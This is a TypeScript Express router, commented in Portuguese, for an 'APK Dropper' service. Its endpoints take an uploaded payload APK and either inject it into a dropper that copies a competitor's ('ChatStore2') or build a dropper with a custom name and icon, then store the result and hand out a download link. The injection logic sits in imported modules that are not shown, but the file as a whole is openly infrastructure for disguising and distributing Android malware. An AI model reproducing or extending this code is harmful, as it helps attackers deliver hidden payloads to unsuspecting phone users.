/**
 * Rotas REST para o APK Dropper
 * POST /api/dropper/inject — modo real: injeta APK no dropper ChatStore2 (replica concorrente)
 * POST /api/dropper/build  — modo legado: dropper customizável com nome/ícone
 * GET  /api/dropper/status/:id — retorna status + log do job
 * GET  /api/dropper/download/:id — redireciona para URL do dropper gerado
 */

import { Router, Request, Response } from "express";
import multer from "multer";
import { v4 as uuidv4 } from "uuid";
import { injectDropper } from "./dropperInjector.js";
import { buildDropper } from "./dropperBuilder.js";
import { storagePut, storageGet } from "./storage.js";
import { createDropperJob, getDropperJob, updateDropperJob } from "./dropperDb.js";

const router = Router();

// Multer: campos múltiplos (apk + icon), limite 200 MB
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 200 * 1024 * 1024 },
});

// ─── POST /api/dropper/inject (MODO REAL — replica concorrente) ───────────────

router.post("/inject", upload.fields([{ name: "apk", maxCount: 1 }]), async (req: Request, res: Response) => {
  try {
    const files = req.files as Record<string, Express.Multer.File[]>;
    const apkFile = files?.["apk"]?.[0];
    if (!apkFile) {
      res.status(400).json({ error: "Nenhum arquivo APK enviado." });
      return;
    }

    const jobId = uuidv4();
    const payloadName = apkFile.originalname;

    const { key: payloadKey } = await storagePut(
      `dropper-jobs/${jobId}/payload_${payloadName}`,
      apkFile.buffer,
      "application/vnd.android.package-archive",
    );

    await createDropperJob({
      id: jobId,
      appName: "inject-mode",
      payloadName,
      status: "pending",
      progress: 0,
      payloadKey,
      iconKey: null,
    });

    injectDropperAsync(jobId, apkFile.buffer, payloadName);

    res.json({ jobId, status: "pending", mode: "inject" });
  } catch (err) {
    console.error("[Dropper Inject]", err);
    res.status(500).json({ error: (err as Error).message });
  }
});

// ─── POST /api/dropper/build ─────────────────────────────────────────────────

router.post(
  "/build",
  upload.fields([
    { name: "apk", maxCount: 1 },
    { name: "icon", maxCount: 1 },
  ]),
  async (req: Request, res: Response) => {
    try {
      const files = req.files as Record<string, Express.Multer.File[]>;
      const apkFile = files?.["apk"]?.[0];
      const iconFile = files?.["icon"]?.[0];

      if (!apkFile) {
        res.status(400).json({ error: "Nenhum arquivo APK enviado." });
        return;
      }

      const appName = (req.body?.appName as string)?.trim() || "Meu App";

      if (appName.length < 1 || appName.length > 64) {
        res.status(400).json({ error: "Nome do app deve ter entre 1 e 64 caracteres." });
        return;
      }

      const jobId = uuidv4();
      const payloadName = apkFile.originalname;

      // Salva APK payload no S3
      const { key: payloadKey } = await storagePut(
        `dropper-jobs/${jobId}/payload_${payloadName}`,
        apkFile.buffer,
        "application/vnd.android.package-archive",
      );

      // Salva ícone no S3 (se enviado)
      let iconKey: string | undefined;
      if (iconFile) {
        const { key } = await storagePut(
          `dropper-jobs/${jobId}/icon.png`,
          iconFile.buffer,
          iconFile.mimetype || "image/png",
        );
        iconKey = key;
      }

      // Cria registro do job
      await createDropperJob({
        id: jobId,
        appName,
        payloadName,
        status: "pending",
        progress: 0,
        payloadKey,
        iconKey: iconKey || null,
      });

      // Processa de forma assíncrona
      buildDropperAsync(jobId, appName, apkFile.buffer, iconFile?.buffer || null);

      res.json({ jobId, status: "pending" });
    } catch (err) {
      console.error("[Dropper Build]", err);
      res.status(500).json({ error: (err as Error).message });
    }
  },
);

// ─── GET /api/dropper/status/:id ─────────────────────────────────────────────

router.get("/status/:id", async (req: Request, res: Response) => {
  try {
    const job = await getDropperJob(req.params.id);
    if (!job) {
      res.status(404).json({ error: "Job não encontrado." });
      return;
    }

    res.json({
      jobId: job.id,
      status: job.status,
      progress: job.progress,
      log: job.logText ? job.logText.split("\n") : [],
      appName: job.appName,
      payloadName: job.payloadName,
      packageName: job.packageName || null,
      downloadUrl: job.dropperUrl || null,
      errorMessage: job.errorMessage || null,
    });
  } catch (err) {
    res.status(500).json({ error: (err as Error).message });
  }
});

// ─── GET /api/dropper/download/:id ───────────────────────────────────────────

router.get("/download/:id", async (req: Request, res: Response) => {
  try {
    const job = await getDropperJob(req.params.id);
    if (!job || job.status !== "done" || !job.dropperKey) {
      res.status(404).json({ error: "APK dropper não disponível." });
      return;
    }

    const { url } = await storageGet(job.dropperKey);
    res.redirect(url);
  } catch (err) {
    res.status(500).json({ error: (err as Error).message });
  }
});

// ─── Injeção assíncrona (modo real) ──────────────────────────────────────────

async function injectDropperAsync(
  jobId: string,
  payloadBuffer: Buffer,
  payloadName: string,
): Promise<void> {
  try {
    await updateDropperJob(jobId, { status: "processing", progress: 10 });
    await updateDropperJob(jobId, {
      progress: 15,
      logText: "🔐 Iniciando injeção no dropper real (ChatStore2 mode)...",
    });

    const result = await injectDropper(payloadBuffer);

    await updateDropperJob(jobId, { progress: 85 });

    const dropperName = payloadName.replace(/\.apk$/i, "") + "_dropper_injected.apk";
    const { key: dropperKey, url: dropperUrl } = await storagePut(
      `dropper-jobs/${jobId}/dropper_${dropperName}`,
      result.apkBuffer,
      "application/vnd.android.package-archive",
    );

    await updateDropperJob(jobId, { progress: 95 });

    const logText = result.log.join("\n");

    await updateDropperJob(jobId, {
      status: "done",
      progress: 100,
      logText,
      dropperKey,
      dropperUrl,
      packageName: result.packageName || null,
    });
  } catch (err) {
    console.error("[Dropper Inject Async]", err);
    await updateDropperJob(jobId, {
      status: "error",
      progress: 0,
      errorMessage: (err as Error).message,
      logText: `❌ Erro durante a injeção: ${(err as Error).message}`,
    });
  }
}

// ─── Build assíncrono (modo legado) ──────────────────────────────────────────

async function buildDropperAsync(
  jobId: string,
  appName: string,
  payloadBuffer: Buffer,
  iconBuffer: Buffer | null,
): Promise<void> {
  try {
    await updateDropperJob(jobId, { status: "processing", progress: 10 });

    await updateDropperJob(jobId, {
      progress: 20,
      logText: "📦 Iniciando build do APK dropper...",
    });

    const result = await buildDropper({
      appName,
      payloadApkBuffer: payloadBuffer,
      iconBuffer: iconBuffer || null,
    });

    await updateDropperJob(jobId, { progress: 80 });

    // Salva dropper gerado no S3
    const dropperName =
      appName.replace(/[^a-zA-Z0-9]/g, "_").slice(0, 30) + "_dropper.apk";

    const { key: dropperKey, url: dropperUrl } = await storagePut(
      `dropper-jobs/${jobId}/dropper_${dropperName}`,
      result.apkBuffer,
      "application/vnd.android.package-archive",
    );

    await updateDropperJob(jobId, { progress: 95 });

    const logText = result.log.join("\n");

    await updateDropperJob(jobId, {
      status: "done",
      progress: 100,
      logText,
      dropperKey,
      dropperUrl,
    });
  } catch (err) {
    console.error("[Dropper Build Async]", err);
    await updateDropperJob(jobId, {
      status: "error",
      progress: 0,
      errorMessage: (err as Error).message,
      logText: `❌ Erro durante o build: ${(err as Error).message}`,
    });
  }
}

export default router;
